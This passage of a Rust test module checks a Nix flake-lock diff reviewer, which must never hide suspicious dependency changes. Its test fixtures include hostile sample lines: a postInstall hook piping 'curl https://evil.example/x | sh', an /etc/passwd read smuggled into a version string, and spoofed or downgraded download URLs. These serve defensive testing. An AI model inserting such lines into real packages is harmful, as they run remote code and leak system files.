      "locked": {
        "lastModified": 1795100300,
        "narHash": "sha256-NEWLIB1111111111111111111111111111111111111=",
        "owner": "nix-community",
        "repo": "nixpkgs.lib",
        "rev": "ffffffffffffffffffffffffffffffffffffffff",
        "type": "github"
      }
    },
    "flake-parts": {
      "locked": {
        "lastModified": 1795100400,
        "narHash": "sha256-NEWPARTS11111111111111111111111111111111111=",
        "owner": "hercules-ci",
        "repo": "flake-parts",
        "rev": "1111111111111111111111111111111111111111",
        "type": "github"
      }
    },
    "dessplay": {
      "locked": {
        "lastModified": 1793921315,
        "narHash": "sha256-so1yf65S8fSp/C6ND8ynyrH18EYKFoBuXoSAekk21JA=",
        "owner": "baughn",
        "repo": "dessplay",
        "rev": "a3713199aa447d34d47b437bc20b51dfbbb4099e",
        "type": "github"
      }
    }
  },
  "root": "root",
  "version": 7
}"#;

    #[test]
    fn diff_lockfiles_dedups_and_handles_flakehub_and_ignore_list() {
        let cfg = DiffConfig::default();
        let changes = diff_lockfiles(SAMPLE_OLD_LOCK, SAMPLE_NEW_LOCK, &cfg).unwrap();

        // Unchanged nodes (nix-darwin, dessplay) must not appear.
        assert!(!changes.iter().any(|c| c.repo_id == "nix-darwin/nix-darwin"));
        assert!(!changes.iter().any(|c| c.repo_id == "baughn/dessplay"));

        // Direct + transitive dedup: `crane` and `crane_2` share one InputChange.
        let crane = changes
            .iter()
            .find(|c| c.repo_id == "ipetkov/crane")
            .expect("crane change present");
        assert_eq!(crane.names, vec!["crane", "crane_2"]);
        assert!(!crane.is_ignored);
        assert_eq!(
            crane.compare_url.as_deref(),
            Some(
                "https://github.com/ipetkov/crane/compare/\
                 95e62def851e9d650f0eab63cb4f59a3306e20bd...\
                 eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
            )
        );

        // Transitive non-ignored node (`flake-parts`) is included.
        let parts = changes
            .iter()
            .find(|c| c.repo_id == "hercules-ci/flake-parts")
            .expect("transitive flake-parts change present");
        assert!(!parts.is_ignored);

        // FlakeHub tarball extracts `DeterminateSystems/nixpkgs-weekly` and matches ignore list.
        let weekly = changes
            .iter()
            .find(|c| c.repo_id == "DeterminateSystems/nixpkgs-weekly")
            .expect("flakehub nixpkgs-weekly present");
        assert!(weekly.is_ignored);
        assert!(matches!(weekly.source, InputSource::Tarball { .. }));
        assert_eq!(weekly.compare_url, None);

        // Other default-ignored repos are marked ignored.
        for ignored_repo in [
            "NixOS/nixpkgs",
            "nix-community/home-manager",
            "nix-community/nixpkgs.lib",
        ] {
            let entry = changes
                .iter()
                .find(|c| c.repo_id == ignored_repo)
                .unwrap_or_else(|| panic!("expected {ignored_repo}"));
            assert!(entry.is_ignored, "{ignored_repo} should be ignored");
        }

        // Case-insensitive ignore matching.
        let custom_cfg = DiffConfig {
            ignore_repos: vec!["XDDXDD/NIX-CACHYOS-KERNEL".to_string()],
            max_diff_files: DEFAULT_MAX_DIFF_FILES,
        };
        let custom_changes = diff_lockfiles(SAMPLE_OLD_LOCK, SAMPLE_NEW_LOCK, &custom_cfg).unwrap();
        let cachy = custom_changes
            .iter()
            .find(|c| c.repo_id == "xddxdd/nix-cachyos-kernel")
            .unwrap();
        assert!(cachy.is_ignored);
    }

    #[test]
    fn diff_lockfiles_rejects_unsupported_version() {
        let bad = r#"{"nodes":{},"root":"root","version":8}"#;
        let err = diff_lockfiles(SAMPLE_OLD_LOCK, bad, &DiffConfig::default()).unwrap_err();
        assert!(err.to_string().contains("version 8"));
    }

    #[test]
    fn diff_lockfiles_identical_has_no_changes() {
        let changes =
            diff_lockfiles(SAMPLE_OLD_LOCK, SAMPLE_OLD_LOCK, &DiffConfig::default()).unwrap();
        assert!(changes.is_empty());
    }

    #[test]
    fn pure_bump_filter_accepts_version_hash_rev_and_same_repo_urls() {
        let cases = [
            (
                "flake.lock",
                concat!(
                    "@@ -10,5 +10,5 @@\n",
                    "       \"locked\": {\n",
                    "-        \"lastModified\": 1794962885,\n",
                    "-        \"narHash\": \"sha256-zrweT2tXbcWiJMACOhOr2eYFJKVa6g59ouRaZ3BS5Do=\",\n",
                    "-        \"rev\": \"95e62def851e9d650f0eab63cb4f59a3306e20bd\",\n",
                    "+        \"lastModified\": 1795100200,\n",
                    "+        \"narHash\": \"sha256-8tKjSQajD3mUND1GaAuaWTcuyUpgcGsh5V+l4ibzC7U=\",\n",
                    "+        \"rev\": \"eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee\",\n",
                    "         \"type\": \"github\"\n",
                ),
            ),
            (
                "package.nix",
                concat!(
                    "@@ -1,6 +1,6 @@\n",
                    " {\n",
                    "-  version = \"6.12.4\";\n",
                    "-  vendorHash = \"sha256-zrweT2tXbcWiJMACOhOr2eYFJKVa6g59ouRaZ3BS5Do=\";\n",
                    "-  url = \"https://github.com/CachyOS/linux/archive/refs/tags/v6.12.4.tar.gz\";\n",
                    "+  version = \"6.12.5\";\n",
                    "+  vendorHash = \"sha256-8tKjSQajD3mUND1GaAuaWTcuyUpgcGsh5V+l4ibzC7U=\";\n",
                    "+  url = \"https://github.com/CachyOS/linux/archive/refs/tags/v6.12.5.tar.gz\";\n",
                    " }\n",
                ),
            ),
            (
                "versions.json",
                concat!(
                    "@@ -2,4 +2,4 @@\n",
                    " {\n",
                    "-  \"x86_64-linux\": \"sha256-zrweT2tXbcWiJMACOhOr2eYFJKVa6g59ouRaZ3BS5Do=\",\n",
                    "-  \"date\": \"2026-11-20\"\n",
                    "+  \"x86_64-linux\": \"sha256-8tKjSQajD3mUND1GaAuaWTcuyUpgcGsh5V+l4ibzC7U=\",\n",
                    "+  \"date\": \"2026-11-26\"\n",
                    " }\n",
                ),
            ),
            (
                "flake.lock",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-        \"url\": \"https://api.flakehub.com/f/pinned/DeterminateSystems/nixpkgs-weekly/0.1.1113206%2Brev-f4a03c008967841f2a0b3cb7c436fc6fc31671f6/01a1e7ff-6305-7ad2-bb1f-9855526cb446/source.tar.gz\"\n",
                    "+        \"url\": \"https://api.flakehub.com/f/pinned/DeterminateSystems/nixpkgs-weekly/0.1.1114000%2Brev-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/01a2f800-7416-8be3-cc20-0966637dc557/source.tar.gz\"\n",
                ),
            ),
        ];

        for (path, patch) in cases {
            let hunks = parse_patch(patch);
            assert_eq!(hunks.len(), 1, "expected 1 hunk for {path}");
            assert!(
                is_pure_version_or_hash_hunk(path, &hunks[0]),
                "expected pure bump for {path}:\n{patch}"
            );
        }
    }

    #[test]
    fn pure_bump_filter_never_hides_security_relevant_changes() {
        let substantive_cases = [
            (
                "host change in URL",
                "package.nix",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-  url = \"https://github.com/owner/repo/archive/v1.0.0.tar.gz\";\n",
                    "+  url = \"https://evil.example/owner/repo/archive/v1.0.1.tar.gz\";\n",
                ),
            ),
            (
                "owner change in GitHub URL",
                "package.nix",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-  url = \"https://github.com/upstream/repo/archive/v1.0.0.tar.gz\";\n",
                    "+  url = \"https://github.com/attacker/repo/archive/v1.0.1.tar.gz\";\n",
                ),
            ),
            (
                "https to http downgrade",
                "package.nix",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-  url = \"https://github.com/owner/repo/archive/v1.0.0.tar.gz\";\n",
                    "+  url = \"http://github.com/owner/repo/archive/v1.0.1.tar.gz\";\n",
                ),
            ),
            (
                "unpaired added URL",
                "package.nix",
                concat!(
                    "@@ -1,1 +1,2 @@\n",
                    "   version = \"1.0.0\";\n",
                    "+  url = \"https://github.com/owner/repo/archive/v1.0.1.tar.gz\";\n",
                ),
            ),
            (
                "mixed hash bump and shell hook",
                "package.nix",
                concat!(
                    "@@ -1,3 +1,4 @@\n",
                    "-  hash = \"sha256-zrweT2tXbcWiJMACOhOr2eYFJKVa6g59ouRaZ3BS5Do=\";\n",
                    "+  hash = \"sha256-8tKjSQajD3mUND1GaAuaWTcuyUpgcGsh5V+l4ibzC7U=\";\n",
                    "+  postInstall = \"curl https://evil.example/x | sh\";\n",
                ),
            ),
            (
                "nix interpolation inside version",
                "package.nix",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-  version = \"1.0.0\";\n",
                    "+  version = \"${builtins.readFile /etc/passwd}\";\n",
                ),
            ),
            (
                "added patch file import",
                "default.nix",
                concat!(
                    "@@ -1,2 +1,3 @@\n",
                    "   patches = [\n",
                    "+    ./extra.patch\n",
                    "   ];\n",
                ),
            ),
            (
                "changes inside a .patch file are never filtered",
                "patches/kernel.patch",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-version = \"6.12.4\";\n",
                    "+version = \"6.12.5\";\n",
                ),
            ),
            (
                "URL userinfo spoofing with @",
                "package.nix",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "-  url = \"https://github.com/owner/repo/archive/v1.0.0.tar.gz\";\n",
                    "+  url = \"https://github.com@evil.example/owner/repo/archive/v1.0.1.tar.gz\";\n",
                ),
            ),
            (
                "context-only hunk with zero changed lines",
                "package.nix",
                concat!(
                    "@@ -1,2 +1,2 @@\n",
                    "   version = \"1.0.0\";\n",
                ),
            ),
        ];

        for (label, path, patch) in substantive_cases {
            let hunks = parse_patch(patch);
            assert_eq!(hunks.len(), 1, "expected 1 hunk for case {label}");
            assert!(
                !is_pure_version_or_hash_hunk(path, &hunks[0]),
                "security case '{label}' MUST NOT be filtered"
            );
        }
    }

    #[test]
    fn sixty_file_cap_applies_after_filtering() {
        let change = InputChange {
            names: vec!["example".to_string()],
            source: InputSource::GitHub {
                owner: "org".to_string(),
                repo: "example".to_string(),
            },
            repo_id: "org/example".to_string(),
            old_rev: Some("1111111111111111111111111111111111111111".to_string()),
            new_rev: Some("2222222222222222222222222222222222222222".to_string()),
            old_last_modified: Some(100),
            new_last_modified: Some(200),
            is_ignored: false,
            compare_url: Some(
                "https://github.com/org/example/compare/\
                 1111111111111111111111111111111111111111...\
                 2222222222222222222222222222222222222222"
                    .to_string(),
            ),
        };
        let cfg = DiffConfig::default();

        // 75 pure-bump files + 5 substantive files = 80 total, 5 substantive <= 60 => NOT collapsed.
        let mut files = Vec::new();
        for i in 0..75 {
            files.push(serde_json::json!({
                "filename": format!("pkg-{i}/version.nix"),
                "status": "modified",
                "additions": 1,
                "deletions": 1,
                "patch": "@@ -1,1 +1,1 @@\n-  version = \"1.0.0\";\n+  version = \"1.0.1\";\n"
            }));
        }
        for i in 0..5 {
            files.push(serde_json::json!({
                "filename": format!("src/mod_{i}.nix"),
                "status": "modified",
                "additions": 1,
                "deletions": 0,
                "patch": "@@ -1,1 +1,2 @@\n {\n+  enableBackdoor = true;\n"
            }));
        }
        let body = serde_json::json!({
            "commits": [
                {
                    "sha": "2222222222222222222222222222222222222222",
                    "commit": {
                        "message": "bump packages\n\ndetails",
                        "author": { "name": "Maintainer" }
                    }
                }
            ],
            "files": files
        })
        .to_string();

        let diff = build_input_diff_from_github_json(&change, &body, &cfg).unwrap();
        assert_eq!(diff.files.len(), 80);
        assert_eq!(diff.hidden_files, 75);
        assert_eq!(diff.hidden_hunks, 75);
        assert_eq!(diff.substantive_files, 5);
        assert!(!diff.collapsed_too_large);
        assert_eq!(diff.commits.len(), 1);
        assert_eq!(diff.commits[0].subject, "bump packages");
        assert_eq!(diff.commits[0].author, "Maintainer");

        // Now test 10 pure-bump files + 61 substantive files => 61 > 60 => collapsed!
        let mut many_files = Vec::new();
        for i in 0..10 {
            many_files.push(serde_json::json!({
                "filename": format!("bump-{i}.nix"),
                "status": "modified",
                "additions": 1,
                "deletions": 1,
                "patch": "@@ -1,1 +1,1 @@\n-  version = \"1.0.0\";\n+  version = \"1.0.1\";\n"
            }));
        }
        for i in 0..61 {
            many_files.push(serde_json::json!({
                "filename": format!("code-{i}.nix"),
                "status": "modified",
                "additions": 1,
                "deletions": 0,
                "patch": "@@ -1,1 +1,2 @@\n {\n+  foo = bar;\n"
            }));
        }
        let many_body = serde_json::json!({
            "commits": [],
            "files": many_files
        })
        .to_string();

        let large_diff = build_input_diff_from_github_json(&change, &many_body, &cfg).unwrap();
        assert_eq!(large_diff.files.len(), 71);
        assert_eq!(large_diff.hidden_files, 10);
        assert_eq!(large_diff.substantive_files, 61);
        assert!(large_diff.collapsed_too_large);
    }

    #[test]
    fn omitted_patch_files_are_never_filtered() {
        let change = InputChange {
            names: vec!["bin".to_string()],
            source: InputSource::GitHub {
                owner: "org".to_string(),
                repo: "bin".to_string(),
            },
            repo_id: "org/bin".to_string(),
            old_rev: Some("1111111111111111111111111111111111111111".to_string()),
            new_rev: Some("2222222222222222222222222222222222222222".to_string()),
            old_last_modified: None,
            new_last_modified: None,
            is_ignored: false,
            compare_url: None,
        };
        let body = serde_json::json!({
            "commits": [],
            "files": [
                {
                    "filename": "blob.bin",
                    "status": "modified",
                    "additions": 0,
                    "deletions": 0
                }
            ]
        })
        .to_string();

        let diff =
            build_input_diff_from_github_json(&change, &body, &DiffConfig::default()).unwrap();
        assert_eq!(diff.files.len(), 1);
        assert!(!diff.files[0].is_filtered);
        assert!(diff.files[0].no_patch_reason.is_some());
        assert_eq!(diff.substantive_files, 1);
        assert_eq!(diff.hidden_files, 0);
    }

    #[test]
    fn pending_flake_update_cancel_and_drop_clean_up_temp_dir() {
        let temp_dir = create_unique_temp_dir("nix-deploy-test-cancel").unwrap();
        let output_lock = temp_dir.join("output.lock");
        let mut cmd = Command::new("sleep");
        cmd.arg("60");
        let pending = PendingFlakeUpdate::spawn_command(
            cmd,
            temp_dir.clone(),
            output_lock,
            SAMPLE_OLD_LOCK.as_bytes().to_vec(),
            DiffConfig::default(),
        )
        .unwrap();
        assert!(temp_dir.exists());
        pending.cancel();
        assert!(!temp_dir.exists());
    }

    #[test]
    fn pending_flake_update_wait_and_apply_atomically() {
        let repo_dir = create_unique_temp_dir("nix-deploy-test-apply").unwrap();
        std::fs::write(repo_dir.join("flake.lock"), SAMPLE_OLD_LOCK).unwrap();

        let work_dir = create_unique_temp_dir("nix-deploy-test-work").unwrap();
        let output_lock = work_dir.join("output.lock");
        let staged_new = work_dir.join("new.lock");
        std::fs::write(&staged_new, SAMPLE_NEW_LOCK).unwrap();

        let mut cmd = Command::new("cp");
        cmd.arg(&staged_new).arg(&output_lock);

        let pending = PendingFlakeUpdate::spawn_command(
            cmd,
            work_dir.clone(),
            output_lock,
            SAMPLE_OLD_LOCK.as_bytes().to_vec(),
            DiffConfig::default(),
        )
        .unwrap();

        let result = pending.wait().unwrap();
        assert!(!work_dir.exists(), "temp work dir should be cleaned up");
        assert!(result.has_changes());
        assert_eq!(result.reviewable_changes().len(), 3);

        // Original repo flake.lock must still be untouched before apply().
        assert_eq!(
            std::fs::read_to_string(repo_dir.join("flake.lock")).unwrap(),
            SAMPLE_OLD_LOCK
        );

        result.apply(&repo_dir).unwrap();
        assert_eq!(
            std::fs::read_to_string(repo_dir.join("flake.lock")).unwrap(),
            SAMPLE_NEW_LOCK
        );

        let _ = std::fs::remove_dir_all(&repo_dir);
    }
}
